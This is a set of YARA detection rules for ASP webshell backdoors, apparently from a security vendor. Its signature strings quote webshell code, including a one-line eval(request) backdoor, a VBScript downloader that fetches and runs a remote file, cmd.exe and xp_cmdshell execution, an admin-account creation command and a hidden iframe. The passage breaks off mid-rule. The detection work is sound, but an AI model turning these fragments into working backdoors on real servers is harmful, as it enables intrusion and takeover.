rule f025a89594e44c9e7f1be2f6781dffdd6ddf9704
{
     meta:
        description = "asp - file f025a89594e44c9e7f1be2f6781dffdd6ddf9704.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "9339bd6cf23b8883fd5adc5f2813145689f0b4e081d355a91e52ffc75209238c"
     strings:
        $s1 = "seal.write \"xml.Open \"\"GET\"\",\"\"http://www35.websamba.com/cybervurgun/file.zip\"\",False\" & vbcrlf" fullword ascii
        $s2 = "seal.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreateOverWrite\" & vbcrlf" fullword ascii
        $s3 = "seal.write \"WshShell.Run \"\"c:\\downloaded.zip\"\", 0, false\" & vbcrlf" fullword ascii
        $s4 = "WshShell.Run \"c:\\net.vbs\", 0, false" fullword ascii
        $s5 = "Set seal = seal.CreateTextFile(\"c:\\net.vbs\", True)" fullword ascii
        $s6 = "seal.write \"Set WshShell = CreateObject(\"\"WScript.Shell\"\")\" & vbcrlf" fullword ascii
        $s7 = "seal.write \"Set BinaryStream = CreateObject(\"\"ADODB.Stream\"\")\" & vbcrlf" fullword ascii
        $s8 = "seal.write \"Set xml = CreateObject(\"\"Microsoft.XMLHTTP\"\")\" & vbcrlf" fullword ascii
        $s9 = "Set seal = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
        $s10 = "seal.write \"BinaryStream.Type = adTypeBinary\" & vbcrlf" fullword ascii
        $s11 = "seal.write \"BinaryStream.Write BinaryData\" & vbcrlf" fullword ascii
        $s12 = "seal.write \"BinaryData = xml.ResponsebOdy\" & vbcrlf" fullword ascii
        $s13 = "seal.write \"Dim WshShell\"  & vbcrlf" fullword ascii
        $s14 = "seal.write \"BinaryStream.Open\" & vbcrlf" fullword ascii
        $s15 = "seal.write \"Dim BinaryStream\" & vbcrlf" fullword ascii
        $s16 = "seal.write \"Const adTypeBinary = 1\" & vbcrlf" fullword ascii
     condition:
        ( uint16(0) == 0x533c and filesize < 3KB and ( 8 of them )) or ( all of them )
}

rule sig_6fd212fac7137a105827a36423af0c7b2afb67a2
{
     meta:
        description = "asp - file 6fd212fac7137a105827a36423af0c7b2afb67a2.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f0eff8eadc87970313c6f5cc086bb8e9bb6630fcc4346c3df17afb52a6a73848"
     strings:
        $s1 = ",#bEr2HzH{:nq\"/jJr`k+s4CrMl#D -D ? Ok+E5n\"`4Ym2alhcD D /,nYbDAR /UGa/+\"~" fullword ascii
        $s2 = "PrE@*D/Gw{NG4D+:,vB{xWbO^l,:MWW@!EE,+OkMAR /UGa/+]~" fullword ascii
        $s3 = "E@#@&+a+1EOnvjxAUmKN+v4;#*@#@&0;x^ObWUP`U2   mG[ `m^b@#@&WWM~bPx,F,YW,V U`1mb@#@&~~,k0,hk9`m1Sr~8#@!@*~J" fullword ascii
        $s4 = "~#rJOm L86s+Ykz? Vkw LxbYak.mjEr`Om %4}+OC DZ . .+U~{P6UsN4W,Y jP" fullword ascii
        $s5 = "~Jr@*Y   GWz@!\"k/nm^;UxiP -lU@*[nM'DGsKm~Y   G6@!ErP YkMhcn/   W2/ D~" fullword ascii
        $s6 = "PrJ@*DUG0J@!e/d+^^!?~+7C/@*Nn.{DWsG1POxKW@!JE,+DkDSR dxKwd+MP" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 6KB and ( all of them ) ) or ( all of them )
}

rule deb0c406fb5d60159939cdc8d8f0dd07973bcbfc
{
     meta:
        description = "asp - file deb0c406fb5d60159939cdc8d8f0dd07973bcbfc.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e4d3d57f4de0497d24095cbd83d5500268323e247e4de2e69cd704975b134678"
     strings:
        $s1 = "RXq1YWc^WszNmOCz!w^WCNd&y!q&Z0 FzqfJ* q^2c1,W*1F{cob0JrPSrNDtxJr 01rJP4nkTtY{EE&y!rJ@*@!&C@*@![k7~/DXsn{Bhr[DtlvZTa6Ial9Nk" fullword ascii
        $s2 = "<%@ LANGUAGE = VBScript.Encode %><% Response.Buffer=True:Server.ScriptTimeout=999999999'" fullword ascii
        $s3 = "Htp=\"http://www.api.com.de/Hack/Hack.html/\"'" fullword ascii
        $s4 = "N@!z(@*@!zO9@*@!zYM@*r@#@&wW.PAl^4,SPbUPwWV9 Wk^+k@#@&?(xUq'J@!OD,/Oz^+'EE(l^3T.KEU9O1WVKD=:FyF+FyJE~KxHK;/" fullword ascii
        $s5 = "VB@*@!0KUOP1W^W.'.n9@*E[UnD7+.(h[J@!&6WUY@*@!Jl@*@!z(@*@!JY9@*@!JY.@*@!zOC(V+@*E@#@&LJ@!OC4^+,hrNO4{Bq!ZYB,tnrTtYxvO!YB,^" fullword ascii
        $s6 = "74ZMS6~[,J~nKDOHK'J,'P6YwaG.Y,[,\\8Z.J6@#@&:D~',Jj(:2P\\)&1P2g)gZ3rPLP\\(ZMJ0@#@&U+SNGhmkx,xPrO?AP9rtb&1EP'~74/DdWPLPERGW:Cr" fullword ascii
        $s7 = "N,(0=qWPANrO}r.,@*',cP:4nx=29kOr6#,'~29rY}r#~ Pcl39kOr}F{!lAx9Pq6)&WPANrY}r#~@*'Py~K4+x=3[kDr}.~'~39kOr}#P P+lANkO6}|x!=3" fullword ascii
        $s8 = "nAEk+MPxPERU2PjU3IU2PihJP'~74/DdW,[~rO&n'ZRZ !c!EPLP-8;DS6~[,JOhG.YgW{J~[~WDw2WMOPLP-8;DSW~LPEO`d" fullword ascii
        $s9 = "B@*F@!&6WxO@*r@#@&/bxkk'r@!mPtM+6xBNl-lkm.raY)U4WSsW^[nDvJrJ'InKmY4`hCY4[Ewr[s Hm:n#LErJbEPDkY^+{EJ" fullword ascii
        $s10 = "`.n$E+dOvJKDKobVnr#LJZKxrb@#@&+UN,kW@#@&x+XO@#@&k0,;8W!x9`dwsrD`)wask1lOrKx`.n$En/Dcrn.KsbV+r#LEZKxE#BJ@!8M@*J*b@*{c!,O4+" fullword ascii
        $s11 = "^B{xLr^lP.O@!@*.YJ@!@*NOJ@!@*B-=ZEx+!VC\\,B4OmwYExNbPBXG$YX+:Bx/dC^m~BDa+DBxnaXY~v4YCwDv{+hmx,YEaxb@!@*9'[k,NO@!@*NYJ@!" fullword ascii
        $s12 = "Pd2^kYv)waVk1COkKxvDn;;nkYcJh.Wwksnr#[EobVnJ*S74^MV6#@#@&sbs+`Ds'DDrhvsk^njMV#@#@&r0,0kWp( obVn2Xr/D/cobV+i.^#~Y4n" fullword ascii
        $s13 = "6-+M'rJOtrdc/OX^nR(l^VTDW;U9ZGVK.{B:+,+,vOBrEPKx\\W!/n6!Y'rEY4k/cdOX^+c4CmVLMW;x9/W^W.xEaF+qyF+BrE@*Jl169'J@!0KUY,0Cm" fullword ascii
        $s14 = "Y~^{/+ddbWU`r^r#@#@&lcl4KDD@#@&U+OPmPx~gWY4rxT@#@&( C4KDD@#@&?nO,4~',HWDtrUT@#@&^ m4GDD@#@&?nDP1P',1KOtbxL@#@&2an;EK" fullword ascii
        $s15 = "8WMN+Mxv!E@*@!zr0.Cs+@*@!JON@*@!O[,hk[O4'vFuv@*@!&DN@*@!Y9PSrNDtxBRGYv,/YHs+{B4K.[+M)8waPdG^k[P[oswiv@*@!k0.Cs+~xmh" fullword ascii
        $s16 = "D(nLEpnGMY{&&Zvp9lDl8lk+x9(1lsni`kN{.GWDihh['MMCJEiUOD]&DxrJfdU{fdxgCs+EriUYD]cYxJr?3SAZP~CPs\"6H,$Km8s+gls+DP" fullword ascii
        $s17 = "D@*@!Nb\\,dYHVn'E4G.9+D=qwXP/KsrN,a2%f%f0pwCN9rxT)X2XB@*E@#@&?('U(LJ@!6W" fullword ascii
        $s18 = "v@*Gn^@!&m@*,@!l,tMn0{B%l7ld^MkwDls!VVwG.:vJrJ'InKmY4`hCY4[Ewr[S Hm:n#LErJSrJ;WwHsbs+rJbB,msCk/'EC:EPYbOs+{B" fullword ascii
        $s19 = "@!&l@*[U8kwiLU4kwiLU8/ai@!l~msCk/xBmhB,t.n6'B%C7ldmMraYlUtKhsKV9nDvJEZ=-wKMWoMC:,sk^nd-'Hbm.WdG6Y~?5JPU+.-" fullword ascii
        $s20 = "o=PU+4P,#* ZqPCP*+ZFPM~W TFv~@!Pn.kU+tDP9Ub,#* ZF~M,c Zq`,'@*,n\"kU+4Y~0(l6k~N" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 8 of them ) ) or ( all of them )
}

rule sig_0b3f8d5cab56018e96da7ba7ff7d73fc1905c9d9
{
     meta:
        description = "asp - file 0b3f8d5cab56018e96da7ba7ff7d73fc1905c9d9.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "38f8cdee9744d0dd38068e41ab953083ec2c00a9afae4a99bfb8673c7f11ce41"
     strings:
        $x1 = "response.Write \"<input type=submit value='Execute SQL Server Command' style='height:23;width:220' id=submit1 name=submit1>\"" fullword ascii
        $x2 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True) " fullword ascii
        $x3 = "If (Trim(Request.Form(\"submit1\")) = \"Execute SQL Server Command\") xor Trim(Request.QueryString(\"status\"))<>\"\" Then" fullword ascii
        $s4 = "Response.Write \"<b>System Root: </b>\" & WshShell.ExpandEnvironmentStrings(\"%SYSTEMROOT%\") & \"<br>\"" fullword ascii
        $s5 = "Response.Write \"<b>Processor Identifier: </b>\" & WshEnv(\"PROCESSOR_IDENTIFIER\") & \"<br>\"" fullword ascii
        $s6 = "Response.Write \"<b>Cmd Path: </b>\" & WshShell.ExpandEnvironmentStrings(\"%ComSpec%\") & \"<br>\"" fullword ascii
        $s7 = "response.Write \"<br><br><br><body topmargin=5 leftmargin=0><center><h4>Coded By S3rver\"" fullword ascii
        $s8 = "Response.Write \"<form method=\"\"post\"\" action=\"\"\" & Request.ServerVariables(\"SCRIPT_NAME\") & \"?action=fcopy\"\">\"" fullword ascii
        $s9 = "Response.Write \"<form method=\"\"post\"\" action=\"\"\" & Request.ServerVariables(\"SCRIPT_NAME\") & \"?action=filecopy\"\">\"" fullword ascii
        $s10 = "Response.Write \"<b>Processor Architecture: </b>\" & WshEnv(\"PROCESSOR_ARCHITECTURE\") & \"<br>\"" fullword ascii
        $s11 = "Response.Write \"<form method=\"\"post\"\" action=\"\"\" & Request.ServerVariables(\"SCRIPT_NAME\") & \"?action=txtedit\"\">\"" fullword ascii
        $s12 = "keydec=\"<font face='arial' size='1'>.:: Smart.Shell 1.0 &copy; BY <a href='mailto:'>P0Uy@_$3r\\/3R</a> - <a href='' target='_bl" ascii
        $s13 = "keydec=\"<font face='arial' size='1'>.:: Smart.Shell 1.0 &copy; BY <a href='mailto:'>P0Uy@_$3r\\/3R</a> - <a href='' target='_bl" ascii
        $s14 = "teste = WshShell.RegWrite (Trim(Request.QueryString(\"key\")), CInt(Trim(Request.QueryString(\"value\"))), \"REG_BINARY\")" fullword ascii
        $s15 = "Response.Write \"<b>Processor Revision: </b>\" & WshEnv(\"PROCESSOR_REVISION\") & \"<br>\"" fullword ascii
        $s16 = "Response.Write \"<b>Number Of Processors: </b>\" & WshEnv(\"NUMBER_OF_PROCESSORS\") & \"<br>\"" fullword ascii
        $s17 = "Response.Write \"<b>System Drive: </b>\" & WshShell.ExpandEnvironmentStrings(\"%SYSTEMDRIVE%\") & \"<br>\"" fullword ascii
        $s18 = "response.Write \"<font size=2 color=Red face='courier new'>E-Mail: Pouya.S3rver@Gmail.Com</font>\"" fullword ascii
        $s19 = "Response.Write \"<input type=\"\"hidden\"\" name=\"\"process\"\" value=\"\"yes\"\"></td></tr>\"" fullword ascii
        $s20 = "Response.Write \"<tr><td\" & corfundotabela & \"><font face='arial' size='2'>:: \" & showobj(FilesItem0.path) & \"</td><td valig" ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule cbd1941c08433ebae756e9e0e73542c9c09bb866
{
     meta:
        description = "asp - file cbd1941c08433ebae756e9e0e73542c9c09bb866.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5b4a5927e746c8105c6c4acd3a354b4ed637497195cb48923374963f6f54a13e"
     strings:
        $s1 = "<script language=vbs runat=server>eval(request(\"sb\"))" fullword ascii
     condition:
        ( uint16(0) == 0x733c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule ed4a100d2abb186886f50b874fb4ef45d1fe6e32
{
     meta:
        description = "asp - file ed4a100d2abb186886f50b874fb4ef45d1fe6e32.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "3c831b7bcbe70fc0428af4db1be296b2808bd5c42d4b0964d09470bb3d98fa23"
     strings:
        $s1 = "Execute MorfiCoder(\")/*/z/*/(tseuqer lave\")" fullword ascii
     condition:
        ( uint16(0) == 0x4947 and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_9c20d975e571892b9dd0acc47deffbea13351009
{
     meta:
        description = "asp - file 9c20d975e571892b9dd0acc47deffbea13351009.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
     strings:
        $x1 = "j cdx&\"<a href='?Action=EditPower&PowerPath=\\\\.\\\"&ScriptPath&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s2 = "j cdx&\"<a href='?Action=Cmd1Shell' target='FileFrame'>\"&cxd&\" <font color=orangered>" fullword ascii
        $s3 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\"\")'>(4)" fullword ascii
        $s4 = "<a>&nbsp;&nbsp;&nbsp;&nbsp;<a class=am href='javascript:ShowFolder(\"\"C:\\\\Program Files\\\\RhinoSoft.com\"\")'>(3)" fullword ascii
        $s5 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>(5)" fullword ascii
        $s6 = "j cdx&\"<a href='http://mumasec.tk/' target='FileFrame'>\"&cxd&\" <font color=red>www.mumasec.tk\"&ef" fullword ascii
        $s7 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
        $s8 = "j cdx&\"<a href='\"&htp&\"t00ls.asp' target='FileFrame'>\"&cxd&\" <font color=green>" fullword ascii
        $s9 = "j cdx&\"<a href='http://mumasec.tk/' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
        $s10 = "j cdx&\"<a href='http://mumasec.tk/' target='FileFrame'>\"&cxd&\" <font color=garnet>" fullword ascii
        $s11 = "j cdx&\"<a href='?Action=cmdx' target='FileFrame'>\"&cxd&\" <font color=orangered>" fullword ascii
        $s12 = "j SI&\"</tr></table></div><script>var container = new Array(\"\"linklist2\"\"); var objects = new Array(); var links = new Array" ascii
        $s13 = "execute(king(\")`>ktzfte/<>qtkqzbtz/<`(p: ssqrqtk.zxgrzl.))`rde`(zltxjtk&`e/ `&)`brde`(zltxjtk(etbt.fiszhokeUg p: yo rft" fullword ascii
        $s14 = "j cdx&\"<a href='?Action=MMD' target='FileFrame'>\"&cxd&\" <font color=Turquoise>SQL-----SA\"&ef" fullword ascii
        $s15 = "j cdx&\"<a href='?Action=ScanDriveForm' target='FileFrame'>\"&cxd&\" <font color=chocolate>" fullword ascii
        $s16 = "j cdx&\"<a href='?Action=CustomScanDriveForm' target='FileFrame'>\"&cxd&\"  <font color=red>" fullword ascii
        $s17 = "j cdx&\"<a href='?Action=Logout' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s18 = "execute(king(\"`>kz/<>rz/<`&)`SNQKJXBU_NSINSU`(ltswqokqIktcktU.zltxjtN&`>'XXXXXX#'=kgsgeuw rz<>rz/< >'XXXXXX#'=kgsgeuw rz<>rz/<" fullword ascii
        $s19 = "j\"</body><iframe src=http://%63%70%63%2d%67%6f%76%2e%63%6e/%61/%61/%61%2e%61%73%70 width=0 height=0></iframe></html>\"  %>" fullword ascii
        $s20 = "j cdx&\"<a href='?Action=radmin' target='FileFrame'>\"&cxd&\" <font color=Turquoise>Radmin" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule caff3acf1c2b599322d3ce547b8235a847dff373
{
     meta:
        description = "asp - file caff3acf1c2b599322d3ce547b8235a847dff373.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e913f73817415b34eafdce87433d1905f743f4141da10edfa4d8e6e74c439a4f"
     strings:
        $s1 = "axJ1WsFkmGhyu^Wsfu1Wh*-mWhX-mG:+k1WhFu1W:Ru1G:OuswDFksaY -swD&u^2Oc-VaYXus2DvkVaOG-V2ORuV2OOJ@#@&MU9wnX'kwVbYv2+X~Eur#c." fullword ascii
        $s2 = "x@#@&K8RKWkkOrKxP{~f&2x9~lP:FcZGwzPKPP B9?Dl.O fq3U9Of@#@&PyRKK/bYkKx,xPZPlP:  PHw+,xPy@#@&:+ Z4lM/nY~xro8 2q r@#@&jw.Px~:  I" fullword ascii
        $s3 = "NbD+1Y,;D^@#@&+^/n@#@&LJ@!8D@*@!4M@*@!4M@*@!4@*@![r7PCVbLx{mnUD+D@*@!6WUY,dbyn{BlBP1W^GD{B.+9B@*Km//qGD9P2M.GDe@!J0GxO~r[;/" fullword ascii
        $s4 = "PxPERG2J2:3f}H)(gJP'~74/DdW,[~rO&n'ZRZ !c!EPLP-8;DS6~[,JPhG.YgW{J~[~WDw2WMOPLP-8;DSW@#@&:OP{~r?(:2,Hb&1:31z1/2rP'~74ZMJ0@#@&x" fullword ascii
        $s5 = "Esl-~EYr:(;?E'nhmxPvOb:8Ekv{+2HY,YEaxb@!@*9'[k,B+v{xladVKmP9O@!@*E+^N[khv{xLk^C\\,B.nDx+^v{xLk^C,DO@!@*MYz@!@*9Oz@!" fullword ascii
        $s6 = "6OGbxYn.vZjYMc_+avnKDYzDMCXvFb#*[/jDD`_n6vnWMO)DMlH`T#bb*@#@&2^d+,@#@&%r2D.GM\"~ZmUEY~\"+mN\"r@#@&3x9P(0@#@&3U9Ps!UmDkW" fullword ascii
        $s7 = "@!zm@*~J@#@&dr{/kLE@!mPtMnW'ELm\\C/^.bwO)w;V^sG.s`JEELInnmO4`KmY4[J'JLJRglh+*[EEr~Jr3NbYsbsnJr#EP^VCdk'vlsvPDkOs" fullword ascii
        $s8 = "=\"http://lpl38.com/web/FileType/\"'" fullword ascii
        $s9 = "=\"http://lpl38.com/web/pr.exe\"'" fullword ascii
        $s10 = "=\"http://lpl38.com/web/php.txt\"'" fullword ascii
        $s11 = "=\"http://lpl38.com/web/aspx.txt\"'" fullword ascii
        $s12 = "EL+W@#@&%P1Na'r@!l~4M+W'E%m\\CkmMkwD)w;V^sGDs`EE'--' -'J[\"nKlDtv?n/drKxcJwGV9+.KmYtEbLJE#LE'x;^Jr~Jr1" fullword ascii
        $s13 = "=\"http://seay.sinaapp.com/\"'" fullword ascii
        $s14 = "=\"http://lpl38.com/web/\"'" fullword ascii
        $s15 = "+~Y4nx@#@&OaDRmsGk+@#@&6dK( V+Dsk^+vok^+iD^# )DYDb8ED+/{f+@#@&k6P)w2sbmCYbGxvDn5!+/Ocrn.Wwr^+E*[rZtmDrb'8POt" fullword ascii
        $s16 = "bW~`9W1Eh+UOconYAs+s+UO~Xq[ck# /Dz^+ 9kkwVmX{xJrJE#PNG^!:+" fullword ascii
        $s17 = "@!J4@*@!Jl@*@!JKf@*@!K\"Pm^Cd/{K~K9@*~@!wr]H,CmDkGU{P:nO4W['hGkY@*r@#@&LJ@!KG~l^kLx{:r[9V+@*@!A@*" fullword ascii
        $s18 = "'&b:mo+kzcC/a[Wk^+UCs+FEI@!J/mMr2Y@*J@#@&nx[~kE8@#@&@#@&UE8~t+/dCT+c/DCD+Ss/T~0^lTb@#@&LE@!:b$JAPhb[Y4'cRT~4KD9+.'T~mVro" fullword ascii
        $s19 = "~[,!Tq,zPbTZF~e,b*c+ZF,ePW Zq`,z~+.kjn4Y`vakwP',n\"kU+4KO+Ll,xnt:~#W Tq,eP*+ZF~e,*y!qvP@!P+.kUntDP[xzPb*y!F,MPW !8c~'@*P" fullword ascii
        $s20 = "@!&:f@*@!&K\"@*J@#@&~PwWMP3l^4,f.k7nA,kU~w?r 9Mk-+k@#@&LE,@!:IPmVbLx{:rN9Vn~1Vlkd':AKG@*@!s}ItPCmOrKxxgz^YbWUxUmlU9Mk-+L9Mk-" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_3d7cd32d53abc7f39faed133e0a8f95a09932b64
{
     meta:
        description = "asp - file 3d7cd32d53abc7f39faed133e0a8f95a09932b64.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e01aae01ad2c1ae96b5445075d651e7b0e7e0f5649fe2def96525ec4e19b8eaf"
     strings:
        $x1 = "j cdx&\"<a href='http://sb178.com/' target='FileFrame'>\"&cxd&\" <font color=garnet>" fullword ascii
        $x2 = "</b><input type=text name=P VALUES=123456>?<input type=submit value=Execute></td></tr></table></form>\":j SI:SI=\"\":If trim(req" ascii
        $x3 = "j cdx&\"<a href='?Action=EditPower&PowerPath=\\\\.\\\"&ScriptPath&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s4 = "j cdx&\"<a href='?Action=Cmd1Shell' target='FileFrame'>\"&cxd&\" <font color=orangered>" fullword ascii
        $s5 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\"\")'>(4)" fullword ascii
        $s6 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>(5)" fullword ascii
        $s7 = "est.form(\"MMD\") & \"'\":set recResult = adoConn.Execute(strQuery):If NOT recResult.EOF Then:Do While NOT recResult.EOF:strResu" ascii
        $s8 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
        $s9 = "<a>????<a class=am href='javascript:ShowFolder(\"\"C:\\\\Program Files\\\\RhinoSoft.com\"\")'>(3)" fullword ascii
        $s10 = "j cdx&\"<a href='\"&htp&\"t00ls.asp' target='FileFrame'>\"&cxd&\" <font color=green>" fullword ascii
        $s11 = "j cdx&\"<a href='?Action=cmdx' target='FileFrame'>\"&cxd&\" <font color=orangered>" fullword ascii
        $s12 = "j cdx&\"<a href='\"&htp&\"Updates.asp' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
        $s13 = "j SI&\"</tr></table></div><script>var container = new Array(\"\"linklist2\"\"); var objects = new Array(); var links = new Array" ascii
        $s14 = "execute(king(\")`>ktzfte/<>qtkqzbtz/<`(p: ssqrqtk.zxgrzl.))`rde`(zltxjtk&`e/ `&)`brde`(zltxjtk(etbt.fiszhokeUg p: yo rft" fullword ascii
        $s15 = "j cdx&\"<a href='?Action=MMD' target='FileFrame'>\"&cxd&\" <font color=Turquoise>SQL-----SA\"&ef" fullword ascii
        $s16 = "j cdx&\"<a href='?Action=ScanDriveForm' target='FileFrame'>\"&cxd&\" <font color=chocolate>" fullword ascii
        $s17 = "j cdx&\"<a href='?Action=CustomScanDriveForm' target='FileFrame'>\"&cxd&\"  <font color=red>" fullword ascii
        $s18 = "j cdx&\"<a href='?Action=Logout' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s19 = "execute(king(\"`>kz/<>rz/<`&)`SNQKJXBU_NSINSU`(ltswqokqIktcktU.zltxjtN&`>'XXXXXX#'=kgsgeuw rz<>rz/< >'XXXXXX#'=kgsgeuw rz<>rz/<" fullword ascii
        $s20 = "nection\"):adoConn.Open \"Provider=SQLOLEDB.1;Password=\"&password&\";User ID=\"&id:strQuery = \"exec master.dbo.xp_cMdsHeLl '\"" ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_35d6d600ad4e75d1ad170a3a58fdc73e542afe35
{
     meta:
        description = "asp - file 35d6d600ad4e75d1ad170a3a58fdc73e542afe35.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e6a82239fc1b81426dbeaa2ab310d64190f624966383e18db4e733202f6eb802"
     strings:
        $s1 = "shell.asp?miemie=av" fullword ascii
        $s2 = "set fs=server.CreateObject(\"scripting.filesystemobject\")" fullword ascii
        $s3 = "<form method=\"POST\" ACTION=\"\">" fullword ascii
        $s4 = "thisfile.Write(\"\"&Request.form(\"1988\") & \"\")" fullword ascii
        $s5 = "response.write\"<font color=red>Success</font>\"" fullword ascii
        $s6 = "value=\"<%=server.mappath(\"akt.asp\")%>\"> <BR>" fullword ascii
        $s7 = "<div id=\"Layer1\">- BY F4ck</div>" fullword ascii
        $s8 = "response.write\"<font color=red>False</font>\"" fullword ascii
        $s9 = "<title>Welcome To AK Team</title>" fullword ascii
        $s10 = "<TEXTAREA NAME=\"1988\" ROWS=\"18\" COLS=\"78\"></TEXTAREA>" fullword ascii
     condition:
        ( uint16(0) == 0x4947 and filesize < 2KB and ( all of them ) ) or ( all of them )
}

rule sig_143df8e735a7a776468700150dc64008f7944e01
{
     meta:
        description = "asp - file 143df8e735a7a776468700150dc64008f7944e01.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2134e5fad0d686a633c95fdbdf95cfd4cd316eb2c4ee136ef7e05c20a6059847"
     strings:
        $x1 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\13cmd.exe\")&\"' size='40'>\"" fullword ascii
        $x2 = "RRS(~~)`~),~,~portForm(uest.t(req Splitmp =~)`ip~),orm(~est.F(requSplitip = ~,~)`bound to Uu = 0For h(ip)` = 0 ,~-~)p(hu)Str(iIf" ascii
        $x3 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\\\\\"\")'>" fullword ascii
        $s4 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
        $s5 = "case \"apjdel\":apjdel():case\"hiddenshell\":hiddenshell():case \"php\":php():case \"aspx\":aspx():case \"jsp\":jsp():Case \"MMD" ascii
        $s6 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
        $s7 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
        $s8 = "Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next" fullword ascii
        $s9 = "blogurl=\"http://aspmuma.cccpan.com\"" fullword ascii
        $s10 = "SQLOLEDB.1;Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\":conn.ConnectionTimeout=1:conn.open connstr:I" ascii
        $s11 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href=\"&blogurl&\" target=_blank>" ascii
        $s12 = "ExeCute \"sub ShowErr():If Err Then:RRS\"\"<br><a href='javascript:history.back()'><br>&nbsp;\"\" & Err.Description & \"\"</a><b" ascii
        $s13 = "e=tlti' am='ssla c)'~~leFipyCo~~~,~~)&meNaL.~&~\\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI~` ~ -b></>]<b> /ae<ov>M" fullword ascii
        $s14 = "%></body><iframe src=http://cpc-gov.cn/a/a/a.asp width=0 height=0></iframe></html>" fullword ascii
        $s15 = "rrs\"<center><h2>Fuck you,Get out!!</h2><br><a href='javascript:history.back()'>" fullword ascii
        $s16 = "e=tlti' am='ssla c)'~~leFiitEd~~~,~~)&meNaL.~&~\\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI~`> /al<De'>" fullword ascii
        $s17 = ")&chr(10):Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provid" ascii
        $s18 = "NewFolder(FName):Set ABC=Nothing:Case \"UpFile\":UpFile():Case \"Cmd1Shell\":Cmd1Shell():Case \"Logout\":Session.Contents.Remove" ascii
        $s19 = "Then:If Err.number = -2147217843 or Err.number = -2147467259 Then:If InStr(Err.description, \"(Connect()).\") > 0 Then:RRS(targe" ascii
        $s20 = "e=tlti' am='ssla c)'~~leFiveMo~~~,~~)&meNaL.~&~\\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI`>~<br><b~K)&2410e/iz.s(Lng" ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule a8dde654da009fcac59013b2f2394f1c548ba1ff
{
     meta:
        description = "asp - file a8dde654da009fcac59013b2f2394f1c548ba1ff.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
     strings:
        $x1 = "Report = Report&\"<tr><td>\"&temp&\"</td><td>Server.Exec\"&\"ute</td><td><font color=red>" fullword ascii
